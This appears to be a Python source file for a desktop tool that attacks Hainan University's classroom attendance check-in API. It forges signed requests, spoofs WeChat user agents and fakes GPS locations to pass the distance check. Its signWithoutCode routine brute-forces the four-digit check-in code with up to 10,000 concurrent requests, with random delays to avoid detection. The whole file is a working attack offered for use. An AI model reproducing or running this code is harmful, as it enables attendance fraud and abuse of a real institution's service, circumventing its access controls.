# -*- coding: utf-8 -*-
# @Time    : 2026.5.28
# @Author  : xlxlSakura
# @FileName: fuckHNU.py
# @Software: PyCharm
# @Description: FUCK the signing system of HNU and CRACK the sign-token.
# @Version: 0.1

import re
import time
import requests
import payLoadsUtils
import studentInfo #############抓包获得的个人信息
import signUtils
from flask import Flask, render_template, redirect, url_for, request, jsonify
from datetime import datetime
import webview
import json
import asyncio
import aiohttp
import random
from tqdm.asyncio import tqdm
import ctypes

"""
studentInfo内的个人信息格式(抓getUserOpenId这个包里面都有)：
infos = {
    "unitCode" : "", 用户码
    "userCode" : "", 学号
    "userName": "", 姓名
    "syMc": "", 书院名
    "syBjMc": "", 书院班级名
    "dsZgh": "", 导师号
    "dsXm": "", 导师姓名
    "fdyZgh": "", 辅导员号
    "fdyXm": "", 辅导员姓名
    "bjMc": "", 学院班级名
    "zyMc": "", 专业名
    "xyMc": "", 学院名
    "xn" : "2025-2026", 学年
}
"""

serverUrl = "https://ktkq.hainanu.edu.cn/app"

qdkblist = {}
today_schedule = []
cur_student = ""

total_requests = 10000  # 总请求数
concurrent_limit = 20  # 最大并发数
timeout_secs = 10

main_window = None

user_agents = [
    "Mozilla/5.0 (Linux; Android 13; 2211133C Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/5678 MicroMessenger/8.0.40.2420(0x28002837) Process/appbrand2 WeChat/8.0.40 NetType/4G Language/zh_CN ABI/arm64 MiniProgramEnv",
    "Mozilla/5.0 (Linux; Android 12; ABY-AL00 Build/HUAWEIABY-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.114 Mobile Safari/537.36 MMWEBID/1234 MicroMessenger/8.0.42.2460(0x28002A34) Process/appbrand0 WeChat/8.0.42 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2541939) XWEB/19841",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.73(0x18004935) NetType/WIFI Language/zh_CN",
]
stop_event = asyncio.Event()

app = Flask(__name__, template_folder=signUtils.resource_path('templates'))

def send_post(apiurl,postpayload):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(user_agents),
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxa1e3abcd201139a2/35/page-frame.html"
    }
    try:
        response = requests.post(url=serverUrl + "/" + apiurl, data=postpayload, headers=headers, timeout=10)
        response.raise_for_status()
        print("返回结果:", response.text)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"请求发送失败: {e}")

async def send_post_request(target_url, payload, session, semaphore, token):
    # 如果已经触发了停止信号，直接退出，不再抢占信号量
    if stop_event.is_set():
        return None
    async with semaphore:  # 使用信号量控制并发
        # 再次检查，防止在排队等待信号量期间触发了停止信号
        if stop_event.is_set():
            return None

        try:
            #随机请求头
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random.choice(user_agents),
                "Accept-Encoding": "gzip,compress,br,deflate",
                "Referer": "https://servicewechat.com/wxa1e3abcd201139a2/35/page-frame.html"
            }
            #payload签名
            sign = signUtils.getSignAndTimestamp()
            payload["sign"] = sign[0]
            payload["timestamp"] = sign[1]
            payload["kl"] = token
            #jitter-随机微小延迟
            await asyncio.sleep(random.uniform(0.1, 0.5))

            async with session.post(
                target_url,
                json=payload,
                headers=headers,
                timeout=timeout_secs
            ) as response:
                if response.status == 200:
                    # 读取并解析 JSON
                    try:
                        res_json = await response.json()

                        if res_json.get("status") == "1":
                            print(f"\n[!] 命中目标！签到码为：{token} 。正在停止后续任务...")
                            stop_event.set()  # 触发全局停止信号
                            return "STOPPED"

                    except Exception as json_err:
                        # 预防服务器返回的不是标准的JSON
                        pass

                return response.status

        except Exception as e:
            return f"Error: {e}"

def signWithCode(student, classId, code, location):
    global qdkblist, today_schedule
    pl = payLoadsUtils.process_GetXsQdInfo(student,qdkblist[classId])
    print("getXsQdInfo", pl)

    signInfoResult = send_post("getXsQdInfo", pl)
    time.sleep(random.uniform(0.2, 0.4))
    pl1 = payLoadsUtils.process_GetGpsWzJl(student,qdkblist[classId]["qdId"],location)
    print("getGpsWzJl", pl1)
    distanceResult = send_post("getGpsWzJl", pl1)

    if float(distanceResult["signResult"]) < 350.0 and distanceResult["status"] == "1":
        print(f"距离验证成功，距离{distanceResult["signResult"]}")
    else:
        print(f"距离验证失败，距离{distanceResult["signResult"]}")
        return 2

    time.sleep(random.uniform(0.2, 0.4))
    pl2 = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],code,location)
    print("saveXsQdInfo", pl2)
    signResult = send_post("saveXsQdInfo", pl2)

    if signResult["status"] == "6":
        print("签到异常")
        return 3
    elif signResult["msg"] != "签到成功": ######判断根据不准确 没抓到签到码错误的包。。。
        print("签到码错误")
        return 4
    print("签到成功")
    return 1

async def signWithoutCode(student, classId, location):
    # 限制同时运行的任务数量
    semaphore = asyncio.Semaphore(concurrent_limit)
    url = serverUrl + "/saveXsQdInfo"
    payload = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],"0000",location)

    # 使用 ClientSession 复用连接池
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(total_requests):
            # 创建任务
            token = str(i).zfill(4)
            task = asyncio.ensure_future(send_post_request(url, payload, session, semaphore, token))
            tasks.append(task)

        pbar = tqdm(total=total_requests, desc="爆破中")
        count = 0

        # 结果处理循环
        for f in asyncio.as_completed(tasks):
            res = await f
            count += 1
            pbar.update(1)

            # 每完成 20 个请求更新一次 UI，避免频繁调用 JS 导致卡顿
            if count % 20 == 0 or count == total_requests:
                progress_msg = f"已尝试: {count} / {total_requests}"
                if main_window:
                    # 调用前端定义的 JS 函数 updateProgressBar
                    main_window.evaluate_js(f"updateProgressBar({count}, {total_requests}, '{progress_msg}')")

            if stop_event.is_set() or res == "STOPPED":
                # 命中目标，通知前端成功
                if main_window:
                    main_window.evaluate_js(
                        f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！已找到签到码')")
                for t in tasks:
                    if not t.done(): t.cancel()
                break

        pbar.close()

@app.route('/')
def index():
    refreshClasses(request.args.get('user', list(studentInfo.users_list.keys())[0]))

    now = datetime.now()
    date_str = now.strftime("%Y年%m月%d日")
    time_str = now.strftime("%H:%M:%S")
    week_list = ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"]
    weekday_str = week_list[now.weekday()]
    return render_template('index.html',all_users=studentInfo.users_list,current_user=cur_student, schedule=today_schedule, today_date=date_str, today_time=time_str, weekday=weekday_str)

@app.route('/signin/<int:course_id>')
def signin_page(course_id):
    course = next((item for item in today_schedule if item["id"] == course_id), None)
    if course:
        reloc = "3号教学楼"
        match = re.search(r"\)(\d{1,2})\-", today_schedule[course_id]["location"])
        if match: reloc = match.group(1) + "号教学楼"
        elif "实验" in today_schedule[course_id]["location"]: reloc = "实验楼"
        elif "第一运动" in today_schedule[course_id]["location"]: reloc = "一田"
        elif "第二运动" in today_schedule[course_id]["location"]: reloc = "二田"
        print(reloc)

        return render_template('signin.html', course=course, locations=payLoadsUtils.location_options.keys(), recommend_loc=reloc)
    return "课程未找到", 404


@app.route('/do_signin/<int:course_id>', methods=['POST'])
def do_signin(course_id):
    selected_location = request.form.get('location')
    has_code = request.form.get('has_code')
    signin_code = request.form.get('signin_code')

    if has_code:
        if not signin_code or not re.match(r'^\d{4}$', signin_code):
            return "提交失败：签到码格式不正确（必须为4位数字）", 400

    print(f"---- 签到请求 ----")
    print(f"课程ID: {course_id}")
    print(f"确认地点: {selected_location}")
    print(f"是否有签到码: {'是' if has_code else '否'}")
    if has_code:
        print(f"签到码内容: {signin_code}")
    print(f"----------------")

    if has_code:
        status = signWithCode(cur_student, course_id, signin_code, selected_location)
        if status != 1:
            if status == 4:
                return jsonify({"status": "warning", "message": f"签到失败！签到码错误。"})
            return jsonify({"status": "error", "message": f"签到失败！错误码：{status}"})
    else:
        try:
            asyncio.run(signWithoutCode(cur_student,course_id, selected_location))
        except Exception:
            return jsonify({"status": "error", "message": f"签到失败！错误码：7"})

    for course in today_schedule:
        if course["id"] == course_id:
            course["status"] = "已签到"
            break
    return jsonify({"status": "success", "message": "签到成功！"})

def refreshClasses(student):
    global qdkblist, today_schedule, cur_student
    cur_student = student
    sign = signUtils.getSignAndTimestamp()
    signUtils.sm2_valid(sign[0], signUtils.privateKey, sign[1])

    qdkblist = payLoadsUtils.process_GetQdKbList(send_post("getQdKbList", payLoadsUtils.getStudentClassesPayload(student)))
    ##########没课时用抓包数据测试
    # with open(signUtils.resource_path("test.json"), "r", encoding="utf-8") as f:
    #     testjson = json.load(f)
    # print(testjson)
    # qdkblist = payLoadsUtils.process_GetQdKbList(testjson)

    # today_schedule = [{
    #     "id" : 0,
    #     "name": "大学英语",
    #     "status": "签到未开始",
    #     "location": "(海甸)6-205",
    #     "time": "7:40~9:20",
    #     "period": "第1,2节",
    #     "teacher": "112233"
    # },]
    today_schedule = []

    for lec in qdkblist:
        lec_info = {"id": qdkblist.index(lec)}
        isSigned, isSigning, isSignClose, isOnline = False,False,False,False
        for i in lec:
            if i == "kcMc":
                lec_info["name"] = lec[i]
            elif i == "xsQdQkMc":
                if lec[i] == "已签": isSigned = True
            elif i == "qdQkMc":
                if lec[i] == "签到中": isSigning = True
                elif lec[i] == "已结束": isSignClose = True
            elif i == "skXsStr":
                if lec[i] == "线上": isOnline = True
            elif i == "skDd":
                lec_info["location"] = lec[i]
            elif i == "skSj":
                lec_info["time"] = str(lec[i]).split("(")[1].replace(")","")
                lec_info["period"] = str(lec[i]).split("(")[0]
            elif i == "skJs":
                lec_info["teacher"] = lec[i]
        if not isSigned and not isSigning and not isSignClose:
            lec_info["status"] = "签到未开始"
        elif not isSigned and isSigning:
            lec_info["status"] = "可签到"
        elif isSigned and isSigning and not isOnline:
            lec_info["status"] = "已签(线下)"
        elif isSigned and isSigning and isOnline:
            lec_info["status"] = "已签(线上)"
        elif not isSigned and isSignClose:
            lec_info["status"] = "签到结束(未签)"
        elif isSigned and isSignClose and not isOnline:
            lec_info["status"] = "签到结束(已签线下)"
        elif isSigned and isSignClose and isOnline:
            lec_info["status"] = "签到结束(已签线上)"

        today_schedule.append(lec_info)
    print("today", today_schedule)

if __name__ == "__main__":
    refreshClasses(list(studentInfo.users_list.keys())[0])
    if len(qdkblist) == 0:
        print("今日无课！")
        ctypes.windll.user32.MessageBoxW(0, "今日无课！", "海大课堂考勤Pro Max", 64)
        exit(114514)
    main_window = webview.create_window('海大课堂考勤Pro Max', app, width=1000, height=600)
    webview.start()
